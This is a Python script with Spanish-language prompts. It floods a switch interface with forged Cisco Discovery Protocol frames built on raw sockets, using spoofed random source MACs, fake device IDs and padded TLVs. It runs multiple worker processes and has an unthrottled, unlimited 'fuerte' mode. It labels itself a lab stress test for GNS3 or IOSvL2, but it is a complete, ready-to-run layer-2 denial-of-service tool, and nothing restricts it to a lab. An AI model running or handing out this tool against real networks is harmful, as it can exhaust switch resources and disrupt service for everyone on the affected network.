import os
import random
import signal
import socket
import struct
import subprocess
import sys
import time
from ctypes import c_ulonglong
from multiprocessing import Process, Event, Value

def checksum(data):
    if len(data) % 2:
        data += b"\x00"

    total = 0

    for i in range(0, len(data), 2):
        total += (data[i] << 8) + data[i + 1]
        total = (total & 0xffff) + (total >> 16)

    return (~total) & 0xffff

def tlv(kind, value):
    return struct.pack("!HH", kind, len(value) + 4) + value

def get_iface_mac(iface):
    path = f"/sys/class/net/{iface}/address"

    if not os.path.exists(path):
        return "00:00:00:00:00:00"

    with open(path, "r") as file:
        return file.read().strip()

def iface_mac_bytes(iface):
    raw = get_iface_mac(iface)
    return bytes(int(x, 16) for x in raw.split(":"))

def random_mac():
    return bytes([
        0x02,
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255)
    ])

def get_ip_line(iface):
    try:
        out = subprocess.check_output(
            ["ip", "-br", "addr", "show", iface],
            text=True
        ).strip()
        return out
    except Exception:
        return iface

def list_interfaces():
    interfaces = []

    for iface in sorted(os.listdir("/sys/class/net")):
        if iface == "lo":
            continue

        if os.path.exists(f"/sys/class/net/{iface}"):
            interfaces.append(iface)

    return interfaces

def choose_interface():
    interfaces = list_interfaces()

    if not interfaces:
        print("No se encontraron interfaces de red.")
        sys.exit(1)

    print("")
    print("Interfaces disponibles")
    print("")

    for idx, iface in enumerate(interfaces, 1):
        print(f"{idx}. {get_ip_line(iface)}")

    print("")

    default_iface = interfaces[0]
    choice = input(f"Selecciona la interfaz conectada al switch [Enter = {default_iface}]: ").strip()

    if choice == "":
        return default_iface

    if choice.isdigit():
        pos = int(choice)

        if 1 <= pos <= len(interfaces):
            return interfaces[pos - 1]

    if choice in interfaces:
        return choice

    print(f"Interfaz inválida: {choice}")
    sys.exit(1)

def ask_int(text, default_value, min_value=None, max_value=None):
    while True:
        value = input(f"{text} [Enter = {default_value}]: ").strip()

        if value == "":
            return default_value

        if not value.isdigit():
            print("Valor inválido.")
            continue

        number = int(value)

        if min_value is not None and number < min_value:
            print(f"El valor mínimo es {min_value}.")
            continue

        if max_value is not None and number > max_value:
            print(f"El valor máximo es {max_value}.")
            continue

        return number

def ask_choice(text, default_value, valid_values):
    while True:
        value = input(f"{text} [Enter = {default_value}]: ").strip()

        if value == "":
            return default_value

        if not value.isdigit():
            print("Opción inválida.")
            continue

        number = int(value)

        if number in valid_values:
            return number

        print("Opción inválida.")

def ask_vlan():
    value = input("VLAN nativa a anunciar en CDP [Enter = ninguna]: ").strip()

    if value == "":
        return None

    if not value.isdigit():
        print(f"VLAN inválida: {value}")
        sys.exit(1)

    vlan = int(value)

    if vlan < 1 or vlan > 4094:
        print("La VLAN debe estar entre 1 y 4094.")
        sys.exit(1)

    return vlan

def address_tlv(ip):
    return (
        struct.pack("!I", 1)
        + b"\x01"
        + b"\x01"
        + b"\xcc"
        + struct.pack("!H", 4)
        + socket.inet_aton(ip)
    )

def build_cdp(seq, config, worker):
    fake_ip = f"10.{worker % 250}.{(seq // 250) % 250}.{seq % 250}"

    device = f"{config['prefix']}-{worker}-{seq}-{random.randint(10000, 99999)}".encode()
    port = f"GigabitEthernet{random.randint(0, 9)}/{random.randint(0, 9)}/{random.randint(1, 48)}".encode()

    platform = random.choice([
        f"cisco IOSvL2 LAB {worker}-{seq}",
        f"cisco WS-C2960 LAB {worker}-{seq}",
        f"cisco WS-C3750 LAB {worker}-{seq}",
        f"cisco CISCO2911 LAB {worker}-{seq}",
        f"cisco WS-C6509 LAB {worker}-{seq}"
    ]).encode()

    capabilities = struct.pack("!I", config["capabilities"])
    duplex = b"\x01"

    body = b""
    body += tlv(0x0001, device)
    body += tlv(0x0002, address_tlv(fake_ip))
    body += tlv(0x0003, port)
    body += tlv(0x0004, capabilities)
    body += tlv(0x0006, platform)

    if config["vlan"] is not None:
        body += tlv(0x000a, struct.pack("!H", config["vlan"]))

    body += tlv(0x000b, duplex)

    max_body_len = config["payload_size"] - 8 - 4
    software_base = f"Cisco IOS Software CDP stress worker {worker} seq {seq} ".encode()
    available = max_body_len - len(body) - 4 - len(software_base)

    if available > 0:
        pad_len = min(config["extra"], available)
        software = software_base + (b"X" * pad_len)
    else:
        software = software_base

    body += tlv(0x0005, software)

    header = struct.pack("!BBH", 2, config["ttl"], 0)
    packet = header + body
    csum = checksum(packet)

    return struct.pack("!BBH", 2, config["ttl"], csum) + body

def build_frame(src, cdp):
    dst = bytes.fromhex("01000ccccccc")
    llc_snap = b"\xaa\xaa\x03\x00\x00\x0c\x20\x00"
    payload = llc_snap + cdp
    length = struct.pack("!H", len(payload))

    return dst + src + length + payload

def sender(config, worker, stop_event, counter):
    src_real = iface_mac_bytes(config["iface"])

    try:
        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
        sock.bind((config["iface"], 0))
    except PermissionError:
        print("Ejecuta el script con sudo.")
        stop_event.set()
        return
    except OSError as e:
        print(f"Error usando la interfaz {config['iface']}: {e}")
        stop_event.set()
        return

    sent = 0
    seq = worker * 100000000
    start = time.time()
    last = start
    end_time = start + config["duration"] if config["duration"] > 0 else 0
    delay = 0

    if config["pps"] > 0:
        delay = config["workers"] / config["pps"]

    print(f"worker {worker} activo")

    while not stop_event.is_set():
        if end_time and time.time() >= end_time:
            break

        enviados_bloque = 0

        for _ in range(config["batch_size"]):
            if stop_event.is_set():
                break

            if end_time and time.time() >= end_time:
                break

            seq += 1

            if config["random_src"]:
                src = random_mac()
            else:
                src = src_real

            cdp = build_cdp(seq, config, worker)
            frame = build_frame(src, cdp)

            try:
                sock.send(frame)
            except OSError as e:
                if sent == 0:
                    print(f"worker {worker} error de envio: {e}")
                    time.sleep(1)
                continue

            sent += 1
            enviados_bloque += 1

            if delay > 0:
                time.sleep(delay)

        if enviados_bloque > 0:
            with counter.get_lock():
                counter.value += enviados_bloque

        now = time.time()

        if now - last >= config["stats_interval"]:
            rate = sent / max(now - start, 0.001)
            print(f"worker {worker} packets={sent} avg_pps={rate:.0f}")
            last = now

    now = time.time()
    rate = sent / max(now - start, 0.001)
    print(f"worker {worker} detenido packets={sent} avg_pps={rate:.0f}")

def monitor(config, counter, stop_event, start_time):
    previous = 0

    print("")
    print(f"  {'Tiempo':^8} {'Total':^14} {'Rate':^14} {'Workers':^10}")
    print("  " + "-" * 50)

    while not stop_event.is_set():
        time.sleep(config["stats_interval"])

        current = counter.value
        rate = (current - previous) // config["stats_interval"]
        previous = current

        elapsed = int(time.time() - start_time)
        mins, secs = divmod(elapsed, 60)

        print(f"  {mins:02d}:{secs:02d}   {current:>12,}   {rate:>8,} pkt/s   {config['workers']:>4}")

def titulo(texto):
    print("")
    print(texto)
    print("-" * len(texto))

def build_config():
    cpu_count = os.cpu_count() or 1

    print("")
    print("Configurador de prueba CDP")
    print("Selecciona los parámetros de ejecución.")
    print("Uso recomendado solo en GNS3 o IOSvL2.")
    print("")

    iface = choose_interface()

    print("")
    print("Modos disponibles")
    print("")
    print("1. Suave")
    print("2. Demo")
    print("3. Fuerte")
    print("")

    mode = ask_choice("Selecciona el modo", 3, [1, 2, 3])

    if mode == 1:
        workers = 1
        pps = 500
        duration = 30
        batch_size = 100
        extra = 300
        payload_size = 900
        random_src = True
        mode_name = "suave"

    elif mode == 2:
        workers = min(2, cpu_count)
        pps = 1500
        duration = 45
        batch_size = 250
        extra = 900
        payload_size = 1200
        random_src = True
        mode_name = "demo"

    else:
        workers = cpu_count
        pps = 0
        duration = 0
        batch_size = 1000
        extra = 1450
        payload_size = 1500
        random_src = True
        mode_name = "fuerte"

    print("")
    print("Valores sugeridos cargados.")
    print("Presiona Enter para aceptar cada valor.")
    print("")

    workers = ask_int("Workers", workers, 1, cpu_count)
    pps = ask_int("PPS total, 0 significa sin limite", pps, 0, 1000000)
    duration = ask_int("Duración en segundos, 0 significa infinito hasta Ctrl+C", duration, 0, 3600)
    batch_size = ask_int("Batch size por worker", batch_size, 1, 10000)
    extra = ask_int("Relleno extra del TLV Software Version", extra, 0, 1450)
    payload_size = ask_int("Payload size", payload_size, 300, 1500)
    ttl = ask_int("TTL CDP", 255, 1, 255)
    stats_interval = ask_int("Intervalo de estadísticas en segundos", 1, 1, 10)

    print("")
    print("MAC origen")
    print("")
    print("1. Aleatoria")
    print("2. MAC real de la interfaz")
    print("")

    mac_mode = ask_choice("Selecciona el tipo de MAC origen", 1, [1, 2])
    random_src = mac_mode == 1

    vlan = ask_vlan()

    prefix_default = f"CDP-MICHAEL-{int(time.time())}"
    prefix = input(f"Prefijo Device ID [Enter = {prefix_default}]: ").strip()

    if prefix == "":
        prefix = prefix_default

    return {
        "iface": iface,
        "mode_name": mode_name,
        "workers": workers,
        "pps": pps,
        "duration": duration,
        "batch_size": batch_size,
        "extra": extra,
        "payload_size": payload_size,
        "ttl": ttl,
        "stats_interval": stats_interval,
        "random_src": random_src,
        "vlan": vlan,
        "prefix": prefix,
        "capabilities": 0x00000029
    }

def main():
    if hasattr(os, "geteuid") and os.geteuid() != 0:
        print("Ejecuta con sudo.")
        sys.exit(1)

    config = build_config()

    titulo("Resumen de configuración")

    print(f"Interfaz       : {config['iface']}")
    print(f"MAC real       : {get_iface_mac(config['iface'])}")
    print(f"Modo           : {config['mode_name']}")
    print(f"Workers        : {config['workers']}")
    print(f"PPS            : {config['pps'] if config['pps'] > 0 else 'sin limite'}")
    print(f"Batch size     : {config['batch_size']}")
    print(f"Extra          : {config['extra']}")
    print(f"Payload size   : {config['payload_size']}")
    print(f"TTL            : {config['ttl']}")
    print(f"VLAN           : {config['vlan'] if config['vlan'] is not None else 'sin TLV Native VLAN'}")
    print(f"Duración       : {config['duration'] if config['duration'] > 0 else 'infinita'}")
    print(f"Prefix         : {config['prefix']}")
    print(f"Random SRC MAC : {config['random_src']}")
    print("")

    input("Presiona Enter para iniciar...")

    stop_event = Event()
    counter = Value(c_ulonglong, 0)
    processes = []
    start_time = time.time()

    def stop_handler(sig, frame):
        stop_event.set()

    signal.signal(signal.SIGINT, stop_handler)
    signal.signal(signal.SIGTERM, stop_handler)

    print("")
    print("Envio iniciado. Presiona Ctrl+C para detener.")
    print("")

    monitor_process = Process(
        target=monitor,
        args=(config, counter, stop_event, start_time)
    )
    monitor_process.start()

    for worker in range(config["workers"]):
        process = Process(
            target=sender,
            args=(config, worker, stop_event, counter)
        )
        process.start()
        processes.append(process)

    try:
        for process in processes:
            process.join()
    except KeyboardInterrupt:
        stop_event.set()

    stop_event.set()

    for process in processes:
        if process.is_alive():
            process.terminate()

    if monitor_process.is_alive():
        monitor_process.terminate()

    elapsed = max(int(time.time() - start_time), 1)
    total = counter.value
    avg = total // elapsed

    titulo("Resultado de ejecución")

    print(f"Paquetes enviados : {total:,}")
    print(f"Rate promedio     : {avg:,} pkt/s")
    print(f"Tiempo total      : {elapsed} segundos")
    print("")
    print("Finalizado")

if __name__ == "__main__":
    main()
